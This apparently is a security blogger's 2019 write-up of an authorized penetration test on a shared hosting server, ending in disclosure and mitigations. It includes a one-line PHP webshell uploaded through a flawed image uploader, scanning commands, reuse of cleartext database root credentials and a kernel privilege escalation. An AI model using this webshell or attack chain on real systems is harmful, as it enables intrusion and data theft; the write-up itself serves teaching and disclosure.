<!DOCTYPE html>
<html>
<head>

    <!-- Document Settings -->
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />

    <!-- Base Meta -->
    <!-- dynamically fixing the title for tag/author pages -->



    <title>How I hacked 40 Websites in 7 minutes</title>
    <meta name="HandheldFriendly" content="True" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <!-- Styles'n'Scripts -->
    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css" />
    <link rel="stylesheet" type="text/css" href="/assets/built/screen.edited.css" />
    <link rel="stylesheet" type="text/css" href="/assets/built/syntax.css" />
    <!-- highlight.js -->
    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/default.min.css">
    <style>.hljs { background: none; }</style>

    <!--[if IE]>
        <style>
            p, ol, ul{
                width: 100%;
            }
            blockquote{
                width: 100%;
            }
        </style>
    <![endif]-->
    
    <!-- This tag outputs SEO meta+structured data and other important settings -->
    <meta name="description" content="Simplified technical insights on security, cryptography and distributed systems." />
    <link rel="shortcut icon" href="http://localhost:4000/assets/images/favicon.png" type="image/png" />
    <link rel="canonical" href="http://localhost:4000/how-i-hacked-40-websites-in-7-minutes" />
    <meta name="referrer" content="no-referrer-when-downgrade" />

    <!-- Mathjax Support -->
    <script type="text/javascript" async
          src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML">
    </script>

     <!--title below is coming from _includes/dynamic_title-->
    <meta property="og:site_name" content="Georgios Konstantopoulos" />
    <meta property="og:type" content="website" />
    <meta property="og:title" content="How I hacked 40 Websites in 7 minutes" />
    <meta property="og:description" content="How I went from 0 knowledge to owning 35 databases in 7 minutes and how after a short break I proceed to total server takeover. Last summer I started learning about information security and hacking. Over the last year I’ve played in various wargames, capture the flag and penetration testing" />
    <meta property="og:url" content="http://localhost:4000/how-i-hacked-40-websites-in-7-minutes" />
    <meta property="og:image" content="http://localhost:4000/assets/images/hacked-40mins.png" />
    <meta property="article:publisher" content="https://www.facebook.com/" />
    <meta property="article:author" content="https://www.facebook.com/" />
    <meta property="article:published_time" content="2019-04-01T00:00:00+03:00" />
    <meta property="article:modified_time" content="2019-04-01T00:00:00+03:00" />
    <meta property="article:tag" content="Technical" />
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:title" content="How I hacked 40 Websites in 7 minutes" />
    <meta name="twitter:description" content="How I went from 0 knowledge to owning 35 databases in 7 minutes and how after a short break I proceed to total server takeover. Last summer I started learning about information security and hacking. Over the last year I’ve played in various wargames, capture the flag and penetration testing" />
    <meta name="twitter:url" content="http://localhost:4000/" />
    <meta name="twitter:image" content="http://localhost:4000/assets/images/hacked-40mins.png" />
    <meta name="twitter:label1" content="Written by" />
    <meta name="twitter:data1" content="Georgios Konstantopoulos" />
    <meta name="twitter:label2" content="Filed under" />
    <meta name="twitter:data2" content="Technical" />
    <meta name="twitter:site" content="@gakonst" />
    <meta name="twitter:creator" content="@gakonst" />
    <meta property="og:image:width" content="1400" />
    <meta property="og:image:height" content="933" />

    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Website",
    "publisher": {
        "@type": "Organization",
        "name": "Georgios Konstantopoulos",
        "logo": "http://localhost:4000/false"
    },
    "url": "http://localhost:4000/how-i-hacked-40-websites-in-7-minutes",
    "image": {
        "@type": "ImageObject",
        "url": "http://localhost:4000/assets/images/hacked-40mins.png",
        "width": 2000,
        "height": 666
    },
    "mainEntityOfPage": {
        "@type": "WebPage",
        "@id": "http://localhost:4000/how-i-hacked-40-websites-in-7-minutes"
    },
    "description": "How I went from 0 knowledge to owning 35 databases in 7 minutes and how after a short break I proceed to total server takeover. Last summer I started learning about information security and hacking. Over the last year I’ve played in various wargames, capture the flag and penetration testing"
}
    </script>

    <!-- <script type="text/javascript" src="https://demo.ghost.io/public/ghost-sdk.min.js?v=724281a32e"></script>
    <script type="text/javascript">
    ghost.init({
    	clientId: "ghost-frontend",
    	clientSecret: "f84a07a72b17"
    });
    </script> -->

    <meta name="generator" content="Jekyll 3.6.2" />
    <link rel="alternate" type="application/rss+xml" title="How I hacked 40 Websites in 7 minutes" href="/feed.xml" />


</head>
<body class="post-template">

    <div class="site-wrapper">
        <!-- All the main content gets inserted here, index.hbs, post.hbs, etc -->
        <!-- default -->

<!-- The tag above means: insert everything in this file
into the {body} of the default.hbs template -->

<header class="site-header outer">
    <div class="inner">
        <nav class="site-nav">
    <div class="site-nav-left">
        
            
                <a class="site-nav-logo" href="http://localhost:4000/">Georgios Konstantopoulos</a>
            
        
        
            <ul class="nav" role="menu">
    <li class="nav-home" role="menuitem"><a href="/">Home</a></li>
    <li class="nav-about" role="menuitem"><a href="/about/">About</a></li>
    <li class="nav-talks" role="menuitem"><a href="/talks/">Talks</a></li>
    <!-- <li class="nav-getting-started" role="menuitem"><a href="/tag/getting-started/">Getting Started</a></li> -->
    <!-- <li class="nav-try-ghost" role="menuitem"><a href="https://ghost.org">Try Ghost</a></li> -->
</ul>

        
    </div>
    <div class="site-nav-right">
        <div class="social-links">
            <!--  -->
            
                <a class="social-link social-link-tw" href="https://twitter.com/gakonst" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"/></svg>
</a>
            
        </div>
        <!--  -->
    </div>
</nav>

    </div>
</header>

<!-- Everything inside the #post tags pulls data from the post -->
<!-- #post -->

<main id="site-main" class="site-main outer" role="main">
    <div class="inner">

        <article class="post-full post tag-technical ">

            <header class="post-full-header">
                <section class="post-full-meta">
                    <time class="post-full-meta-date" datetime=" 1 April 2019"> 1 April 2019</time>
                    
                        <span class="date-divider">/</span>
                        
                            
                               <a href='/tag/technical/'>TECHNICAL</a>
                            
                        
                    
                </section>
                <h1 class="post-full-title">How I hacked 40 Websites in 7 minutes</h1>
            </header>

            
            <figure class="post-full-image" style="background-image: url(/assets/images/hacked-40mins.png)">
            </figure>
            

            <section class="post-full-content">
                <div class="kg-card-markdown">
                    <h3 id="how-i-went-from-0-knowledge-to-owning-35-databases-in-7-minutes-and-how-after-a-short-break-i-proceed-to-total-server-takeover">How I went from 0 knowledge to owning 35 databases in 7 minutes and how after a short break I proceed to total server takeover.</h3>

<hr />

<p>Last summer I started learning about information security and hacking. Over the last year I’ve played in various wargames, capture the flag and penetration testing simulations, continuously improving my hacking skills and learning new things about ‘how to make computers deviate from their expected behavior’.</p>

<p>Long story short, my experience was always limited to simulated environments, and since I consider myself a white-hat hacker (aka one of the good guys) I never stuck my nose into other peoples’ businesses — quite literally.</p>

<p>Until now. This will be a detailed story about how I hacked into a server which hosted 40 (this is an exact number) websites and my findings.</p>
<blockquote>
  <p><strong>Note:</strong> Some prerequisite CS knowledge is needed to follow through the technical parts of the article.</p>
</blockquote>

<p>A friend messaged me that an <a href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)">XSS vulnerability</a> was found in his website and that he wants me to take a further look. This is an important stage, as I am inclined to ask for him to formally express that I have his permission to perform a full test on his web application and on the server hosting it. The answer was <strong>positive.</strong></p>

<p><img src="https://cdn-images-1.medium.com/max/2000/0*Lnr40S2JhxSY3JaM.gif" alt="" /></p>
<blockquote>
  <p>In the rest of the post I’ll be refering to my friend’s site as <strong>http://example.com</strong></p>
</blockquote>

<p>The first move is always to enumerate and find as much information as you can about your enemy — while trying to alarm them as little as possible.</p>

<p>At this stage we trigger our timer and start scanning.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">--top-ports</span> 1000 <span class="nt">-T4</span> <span class="nt">-sC</span> <span class="o">[</span>http://example.com]<span class="o">(</span>http://victim.com<span class="o">)</span>
    Nmap scan report <span class="k">for </span>example.com <span class="o">{</span>redacted<span class="o">}</span>
    Host is up <span class="o">(</span>0.077s latency<span class="o">)</span><span class="nb">.</span>
    rDNS record <span class="k">for</span> <span class="o">{</span>redacted<span class="o">}</span>: <span class="o">{</span>redacted<span class="o">}</span>
    Not shown: 972 filtered ports
    PORT      STATE  SERVICE
    21/tcp    open   ftp
    22/tcp    open   ssh
    | ssh-hostkey: 
    |   <span class="o">{</span>redacted<span class="o">}</span>
    80/tcp    open   http
    | http-methods: 
    |_  Potentially risky methods: TRACE
    |_http-title: Victim Site
    139/tcp   open   netbios-ssn
    443/tcp   open   https
    | http-methods: 
    |_  Potentially risky methods: TRACE
    |_http-title: Site doesn<span class="s1">'t have a title (text/html; charset=UTF-8).
    |_{redacted}
    445/tcp   open   microsoft-ds
    5901/tcp  open   vnc-1
    | vnc-info: 
    |   Protocol version: 3.8
    |   Security types: 
    |_    VNC Authentication (2)
    8080/tcp  open   http-proxy
    |_http-title: 400 Bad Request
    8081/tcp  open   blackice-icecap
</span></code></pre></div></div>
<blockquote>
  <p>The scan completed in about 2 minutes.</p>
</blockquote>

<p>That’s a lot of open ports! By observing that the <a href="https://en.wikipedia.org/wiki/File_Transfer_Protocol">FTP</a> (port 21) and SMB (ports 139/445) ports are open we can guess that the server is used for file hosting and for file sharing, along with it being a webserver (ports 80/443 and proxies at 8080/8081).</p>

<p><img src="https://cdn-images-1.medium.com/max/2000/0*9A9HPkmj-NLW7Pe3." alt="From The Art of War. Enumerating is key." /><em>From The Art of War. Enumerating is key.</em></p>

<p>Doing a UDP port scan and scanning more than the top 1000 ports would be considered if the above scan’s information was not enough. The only port we are allowed to interact with (without credentials) is port 80/443.</p>

<p>Without wasting any time, I launch gobuster to enumerate for any interesting files on the webserver while I’ll be digging for information manually.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gobuster <span class="nt">-u</span> http://example.com <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-t</span> 100

/admin
/login
</code></pre></div></div>

<p>Turns out the /admin path was an “admin tool” which allowed authenticated users to modify stuff on the webserver. It required credentials and since we have neither a username nor a password we move on. (spoiler: gobuster did not find anything of value)</p>
<blockquote>
  <p>So far we are about 3 minutes in. Nothing useful, yet.</p>
</blockquote>

<p>Browsing to the website we see that it asks us to login. No problem, we create an account with a <a href="http://www.fakemailgenerator.com">dummy e-mail</a>, click the confirmation e-mail and log-in after few seconds.</p>

<p>The website welcomes us and prompts us to navigate to our profile and update our profile picture. How kind.</p>

<p>Seeing that the website looks custom built, I am inclined to test for an <a href="https://www.owasp.org/index.php/Unrestricted_File_Upload">Unrestricted File Upload</a> vulnerability. On my terminal I execute:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"&lt;?php system(</span><span class="se">\$</span><span class="s2">_GET['cmd']); ?&gt;"</span> <span class="o">&gt;</span> exploit.php
</code></pre></div></div>

<p>I try uploading the “image”, and bingo! The uploader allows the *exploit.php *file to get uploaded. Of course it has no thumbnail, but that means my file got uploaded somewhere.</p>

<p><img src="https://cdn-images-1.medium.com/max/2000/1*qVLgi2XpE-49BlExZ4F3kA.png" alt="Get the exploit’s location" /><em>Get the exploit’s location</em></p>

<p>Here we would expect that the uploader does some sort of processing on the uploaded file, checks its file extension and replaces with the accepted file extension like .jpeg, .jpg in order to avoid remote code execution by an attacker uploading malicious code, like yours truly.</p>

<p>People care about security after all.</p>

<p>right? Right? …RIGHT?</p>

<blockquote>
  <p><code class="highlighter-rouge">Copy image address</code> results in the following url being copied to our clipboard: <code class="highlighter-rouge">http://www.example.com/admin/ftp/objects/XXXXXXXXXXXX.php</code></p>
</blockquote>

<p>So it seems we have our webshell ready and functioning:</p>

<p><img src="https://cdn-images-1.medium.com/max/2000/1*Iom7SAIfa5FEYqmlowq4bA.png" alt="" /></p>

<p>Seeing that the webserver runs** perl** scripts (really, perl?) we grab a perl reverse shell from our favorite <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">cheatsheet</a>, set the IP/Port and we are rewarded with a low-privileged shell — sorry, no screenshot.</p>
<blockquote>
  <p>~5 minutes in the assessment, and we already have a low-privilege shell.</p>
</blockquote>

<p>To my huge surprise, the server was not hosting only 1 website, but <strong>40 different ones</strong>. Sadly I haven’t kept screenshots of every single detail but the output was along the lines of:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ls /var/www

access.log site1/ site2/ site3/ {... the list goes on}
</code></pre></div></div>

<p>You get the point. Surprisingly, read access to **ALL **the hosted websites was available, which meant I could read all the sites’ backend code. I limited myself to example.com’s code.</p>

<p>Notably, inside the cgi-admin/pages directory, all the perl scripts were connecting to a mysql database <strong>as root</strong>. The credentials for the database were there in cleartext. Let these be <em>root:pwned42</em></p>

<p>Sure enough, the server was running MariaDB and I had to resort to this <a href="https://github.com/dockerfile/mariadb/issues/3">issue</a> before being able to access the database. Afterwards we execute:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql <span class="nt">-u</span> root <span class="nt">-p</span> <span class="nt">-h</span> localhost victimdbname
Password: pwned42
</code></pre></div></div>

<p>And we’re in the database with root privileges.</p>

<p><img src="https://cdn-images-1.medium.com/max/2000/1*4lU93dNnB95iwLwJ41oEJg.png" alt="“use databasename;” allows us to access any of the 35 databases and view &amp; modify their contents" /><em>“use databasename;” allows us to access any of the 35 databases and view &amp; modify their contents</em></p>
<blockquote>
  <h1 id="after-just-7-minutes-we-have-full-readwrite-access-to-the-contents-of-35-databases">After just 7 minutes, we have full read/write access to the contents of <strong>35(!) databases</strong></h1>
</blockquote>

<p>Here I am morally obligated to stop, and disclose my findings so far. The potential damage is already huge.</p>

<h3 id="what-an-attacker-could-do">What an attacker could do:</h3>

<ol>
  <li>
    <p>Dump the contents of all the databases, as described <a href="https://stackoverflow.com/questions/9497869/export-and-import-all-mysql-databases-at-one-time">here</a>, resulting in the data of all 35 companies to be leaked in the public domain.</p>
  </li>
  <li>
    <p>Drop all the databases, effectively deleting the data of the 35 compaines</p>
  </li>
  <li>
    <p>Leave a backdoor for persistent access as apache with a cronjob, as described <a href="http://blog.tobiasforkel.de/en/2015/03/19/setup-cron-job-for-apache-user/">here</a>, in case they want a return trip.</p>
  </li>
</ol>

<p>I should note here that the mysql process was running as root so I figured I’d try executing ! whoami in hopes of getting root. Unfortunately I was still apache.</p>
<blockquote>
  <p>Time to take a break. Stop the timer.</p>
</blockquote>

<h2 id="what-can-further-go-wrong">What can further go wrong?</h2>

<p>After disclosing my findings, I get further permission to dig deeper.</p>

<p>Before looking in ways to escalate my privileges to root and be able to cause massive potential damage, I was looking at what other interesting files I could read with my limited user.</p>

<p>At that point, I remembered about the open SMB ports. That meant that there should be some folder somewhere that is being shared in the system among users. After a little enumeration, the following appears at the directory /home/samba/secured (please excuse me for the mass censorship):</p>

<p><img src="https://cdn-images-1.medium.com/max/2000/1*ocvbxfNLYltft2S5Ps3PvQ.png" alt="" /></p>

<p>Inside all of these directories, there were files of each user of the **hosting company. **That included all kinds of sensitive data, amongst others:</p>

<ul>
  <li>
    <p>.psd/.ai files (Designers know how important it is to keep these private, it is their work and their techniques after all)</p>
  </li>
  <li>
    <p>Cookie sqlite files</p>
  </li>
  <li>
    <p>Invoices</p>
  </li>
  <li>
    <p>Pirated e-books (chuckled when I saw this)</p>
  </li>
  <li>
    <p><strong>Credentials to their WiFi SSIDS</strong></p>
  </li>
</ul>

<h3 id="what-an-attacker-could-do-1">What an attacker could do:</h3>

<ol>
  <li>
    <p>Camp outside the company’s offices, login to their intranet and perform all kinds of fun attacks you can do on local networks</p>
  </li>
  <li>
    <p>Dump all the sensitive data listed above to the public domain</p>
    <blockquote>
      <p>It took some time to go through the folders and realize how serious this issue is.
One more break.</p>
    </blockquote>
  </li>
</ol>

<h2 id="the-final-blow">The final blow</h2>

<p>After looking around for a little longer as *apache *I decide it is time to go for the big fish, alas get root access. I refer to a popular <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">cheatsheet</a> and start enumerating the system for interesting files.</p>

<p>Due to my digging so far I had already gone through most of these techniques already and did not seem to be able to find something that would increase my foothold.</p>

<p>That’s when it hit me. In the Capture the Flag challenges that I am used to playing, the operating system is usually patched and it is some intentionally misconfigured service that eventually gives you the sought-after root privilege. In the real world however, <strong>people do not patch.</strong></p>
<blockquote>
  <p>I mean, look at Equifax <em>(couldn’t resist).</em></p>
</blockquote>

<p>What kind of Linux is the server running?</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat</span> /etc/issue
CentOS Linux release 7.2.1511 <span class="o">(</span>Core<span class="o">)</span>
</code></pre></div></div>

<p>What version is the kernel?</p>

<p><img src="https://cdn-images-1.medium.com/max/2000/1*314bUv-XA3_UIvgEKDP9PQ.png" alt="" /></p>

<p>This looks like an old Kernel version.</p>

<p><img src="https://cdn-images-1.medium.com/max/2000/0*vhbpEPj1gk0MUnxf.png" alt="Does this remind you of something? If not, have a read [here](https://www.theguardian.com/technology/2016/oct/21/dirty-cow-linux-vulnerability-found-after-nine-years) (hint: it is VERY serious)" /><em>Does this remind you of something? If not, have a read <a href="https://www.theguardian.com/technology/2016/oct/21/dirty-cow-linux-vulnerability-found-after-nine-years">here</a> (hint: it is VERY serious)</em></p>

<p>I found <a href="http://davemacaulay.com/easily-test-dirty-cow-cve-2016-5195-vulnerability/">this</a> blogpost which pointed me to test if the Kernel was vulnerable with the script found here.</p>

<p><img src="https://cdn-images-1.medium.com/max/2000/1*7a2tb6P72aNH4shZW0qx0Q.png" alt="Timestamps &amp; Firefox restored sites redacted" /><em>Timestamps &amp; Firefox restored sites redacted</em></p>

<p>Followed by:</p>

<p><img src="https://cdn-images-1.medium.com/max/2000/1*3ZoWXbpfqZHdJUn0Ia2JWw.png" alt="" /></p>

<h3 id="game-over">Game over.</h3>

<p>I instantly wrote an e-mail fully disclosing the details and potential impact of every step as described above, and wrapped the night. Whew.</p>

<h3 id="what-an-attacker-could-do-2">What an attacker could do:</h3>

<ol>
  <li>
    <p>Read/modify ALL files on the server</p>
  </li>
  <li>
    <p>Leave a persistent backdoor (as done with apache)</p>
  </li>
  <li>
    <p>Install and potentially spread malware into the server’s intranet</p>
  </li>
  <li>
    <p>Install ransomware (taking the databases of 35 companies and all the hosting company’s data hostage is no small thing)</p>
  </li>
  <li>
    <p>Use the server as a cryptocurrency miner</p>
  </li>
  <li>
    <p>Use the server as a proxy</p>
  </li>
  <li>
    <p>Use the server as a C2C server</p>
  </li>
  <li>
    <p>Use the server as a part of a botnet</p>
  </li>
  <li>
    <p>… (use your imagination)</p>
  </li>
  <li>
    <p>**rm -rf / **(not even joking)</p>
  </li>
</ol>

<p>The next day, I got contacted by my friend (who came in contact with the company operating the server) and was informed that the bug in the file uploader was fixed.</p>

<h2 id="tldr">tl;dr</h2>

<p>Summarizing,we found:</p>

<ol>
  <li>
    <p>A web application with an Unrestricted File Upload vulnerability, which led into a low privilege shell.</p>
  </li>
  <li>
    <p>Credentials to mysql database, which led to read/write access to 35 databases</p>
  </li>
  <li>
    <p>Lots of readable sensitive files</p>
  </li>
</ol>

<p>Finally, we abused an unpatched kernel to obtain root access.</p>

<h2 id="mitigations--suggestions">Mitigations — Suggestions</h2>

<p>Let’s start by the uploader which gave us our inital foothold. Since the whole web application’s backend was written in perl — and as I do not speak perl — I cannot really suggest fixes on that.</p>

<p>One fix I would suggest would be not to use perl in 2017 but that is just my opinion, feel free to prove me wrong.</p>

<p>Regarding the filesystem, I recommend taking great care in assigning proper file permissions for users, according to the <a href="https://en.wikipedia.org/wiki/Principle_of_least_privilege">principle of least privilege</a>. That way, even if a low privileged user like apache gets access, they are not able to read any sensitive files.</p>

<p>Running all websites in the same server is a bad idea, I’m not sure if a dockerized approach would solve the issue.</p>

<p>Having the same credentials for all databases is for sure a bad idea.</p>
<blockquote>
  <p>Single points of failure are generally not good to have.</p>
</blockquote>

<p>Finally, <strong>PATCH EVERYTHING</strong>. It’s literally 1 command: <code class="highlighter-rouge">su -c 'yum update'</code> (CentOS specific)</p>

<h3 id="follow-my-work-on-twitter-for-more-technical-insights">Follow my work on <a href="https://twitter.com/gakonst">Twitter</a> for more technical insights.</h3>

                </div>
            </section>

            <!-- Email subscribe form at the bottom of the page -->
            

            <footer class="post-full-footer">
                <!-- Everything inside the #author tags pulls data from the author -->
                <!-- #author-->
                
                    
                        <section class="author-card">
                            
                                <img class="author-profile-image" src="/assets/images/gakonst.jpg" alt="gakonst" />
                            
                            <section class="author-card-content">
                                <h4 class="author-card-name"><a href="/author/gakonst">Georgios Konstantopoulos</a></h4>
                                
                                    <p>Cryptocurrency & Security Consultant</p>
                                
                            </section>
                        </section>
                        <div class="post-full-footer-right">
                            <a class="author-card-button" href="/author/gakonst">Read More</a>
                        </div>
                    
                
                <!-- /author  -->
            </footer>

            <!-- If you use Disqus comments, just uncomment this block.
            The only thing you need to change is "test-apkdzgmqhj" - which
            should be replaced with your own Disqus site-id. -->
            

        </article>

    </div>
</main>

<!-- Links to Previous/Next posts -->
<aside class="read-next outer">
    <div class="inner">
        <div class="read-next-feed">
            
                
                
                
                
                    <article class="read-next-card"
                        
                            style="background-image: url(/assets/images/blog-cover.jpg)"
                        
                    >
                        <header class="read-next-card-header">
                            <small class="read-next-card-header-sitetitle">&mdash; Georgios Konstantopoulos &mdash;</small>
                            
                                <h3 class="read-next-card-header-title"><a href="/tag/technical/">Technical</a></h3>
                            
                        </header>
                        <div class="read-next-divider"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 14.5s2 3 5 3 5.5-2.463 5.5-5.5S21 6.5 18 6.5c-5 0-7 11-12 11C2.962 17.5.5 15.037.5 12S3 6.5 6 6.5s4.5 3.5 4.5 3.5"/></svg>
</div>
                        <div class="read-next-card-content">
                            <ul>
                                
                                
                                  
                                    
                                        
                                        
                                            <li><a href="/deep-dive-rsa-accumulators">A Deep Dive on RSA Accumulators</a></li>
                                        
                                    
                                  
                                
                                  
                                    
                                  
                                
                            </ul>
                        </div>
                        <footer class="read-next-card-footer">
                            <a href="/tag/technical/">
                                
                                    See all 1 posts  →
                                
                            </a>
                        </footer>
                    </article>
                
            

            <!-- If there's a next post, display it using the same markup included from - partials/post-card.hbs -->
            
                

    <article class="post-card post-template">
        
            <a class="post-card-image-link" href="/deep-dive-rsa-accumulators">
                <div class="post-card-image" style="background-image: url(/assets/images/ethresearch.png)"></div>
            </a>
        
        <div class="post-card-content">
            <a class="post-card-content-link" href="/deep-dive-rsa-accumulators">
                <header class="post-card-header">
                    
                        
                            
                                <span class="post-card-tags">Technical</span>
                            
                        
                    

                    <h2 class="post-card-title">A Deep Dive on RSA Accumulators</h2>
                </header>
                <section class="post-card-excerpt">
                    
                        <p></p>
                    
                </section>
            </a>
            <footer class="post-card-meta">
                
                    
                        
                        <img class="author-profile-image" src="/assets/images/gakonst.jpg" alt="Georgios Konstantopoulos" />
                        
                        <span class="post-card-author">
                            <a href="/author/gakonst/">Georgios Konstantopoulos</a>
                        </span>
                    
                
                <span class="reading-time">
                    
                    
                      1 min read
                    
                </span>
            </footer>
        </div>
    </article>

            

            <!-- If there's a previous post, display it using the same markup included from - partials/post-card.hbs -->
            

        </div>
    </div>
</aside>

<!-- Floating header which appears on-scroll, included from includes/floating-header.hbs -->
<div class="floating-header">
    <div class="floating-header-logo">
        <a href="http://localhost:4000/">
            
                <img src="/assets/images/favicon.png" alt="Georgios Konstantopoulos icon" />
            
            <span>Georgios Konstantopoulos</span>
        </a>
    </div>
    <span class="floating-header-divider">&mdash;</span>
    <div class="floating-header-title">How I hacked 40 Websites in 7 minutes</div>
    <div class="floating-header-share">
        <div class="floating-header-share-label">Share this <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
    <path d="M7.5 15.5V4a1.5 1.5 0 1 1 3 0v4.5h2a1 1 0 0 1 1 1h2a1 1 0 0 1 1 1H18a1.5 1.5 0 0 1 1.5 1.5v3.099c0 .929-.13 1.854-.385 2.748L17.5 23.5h-9c-1.5-2-5.417-8.673-5.417-8.673a1.2 1.2 0 0 1 1.76-1.605L7.5 15.5zm6-6v2m-3-3.5v3.5m6-1v2"/>
</svg>
</div>
        <a class="floating-header-share-tw" href="https://twitter.com/share?text=How+I+hacked+40+Websites+in+7+minutes&amp;url=https://jekyller.github.io/jasper2/how-i-hacked-40-websites-in-7-minutes"
            onclick="window.open(this.href, 'share-twitter', 'width=550,height=235');return false;">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"/></svg>

        </a>
        <a class="floating-header-share-fb" href="https://www.facebook.com/sharer/sharer.php?u=https://jekyller.github.io/jasper2/how-i-hacked-40-websites-in-7-minutes"
            onclick="window.open(this.href, 'share-facebook','width=580,height=296');return false;">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M19 6h5V0h-5c-3.86 0-7 3.14-7 7v3H8v6h4v16h6V16h5l1-6h-6V7c0-.542.458-1 1-1z"/></svg>

        </a>
    </div>
    <progress class="progress" value="0">
        <div class="progress-container">
            <span class="progress-bar"></span>
        </div>
    </progress>
</div>


<!-- /post -->

<!-- The #contentFor helper here will send everything inside it up to the matching #block helper found in default.hbs -->


        <!-- Previous/next page links - displayed on every page -->
        

        <!-- The footer at the very bottom of the screen -->
        <footer class="site-footer outer">
            <div class="site-footer-content inner">
                <section class="copyright"><a href="http://localhost:4000/">Georgios Konstantopoulos</a> &copy; 2019</section>
                <!-- <section class="poweredby">Proudly published with <a href="https://jekyllrb.com/">Jekyll</a> &
                    <a href="https://pages.github.com/" target="_blank" rel="noopener">GitHub Pages</a> using
                    <a href="https://github.com/jekyller/jasper2" target="_blank" rel="noopener">Jasper2</a></section> -->
                <nav class="site-footer-nav">
                    <a href="/">Latest Posts</a>
                    
                    <a href="https://twitter.com/gakonst" target="_blank" rel="noopener">Twitter</a>
                    <!-- <a href="https://ghost.org" target="_blank" rel="noopener">Ghost</a> -->
                </nav>
            </div>
        </footer>

    </div>

    <!-- The big email subscribe modal content -->
    

    <!-- highlight.js -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.10.0/components/prism-abap.min.js"></script>
    <script>$(document).ready(function() {
      $('pre code').each(function(i, block) {
        hljs.highlightBlock(block);
      });
    });</script>

    <!-- jQuery + Fitvids, which makes all video embeds responsive -->
    <script
        src="https://code.jquery.com/jquery-3.2.1.min.js"
        integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4="
        crossorigin="anonymous">
    </script>
    <script type="text/javascript" src="/assets/js/jquery.fitvids.js"></script>
    <script type="text/javascript" src="https://demo.ghost.io/assets/js/jquery.fitvids.js?v=724281a32e"></script>


    <!-- Paginator increased to "infinit" in _config.yml -->
    <!-- if paginator.posts  -->
    <!-- <script>
        var maxPages = parseInt('');
    </script>
    <script src="/assets/js/infinitescroll.js"></script> -->
    <!-- /endif -->

    


    <!-- Add Google Analytics  -->
    <!-- Google Analytics Tracking code -->
 <script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-139131382-1', 'auto');
  ga('send', 'pageview');

 </script>


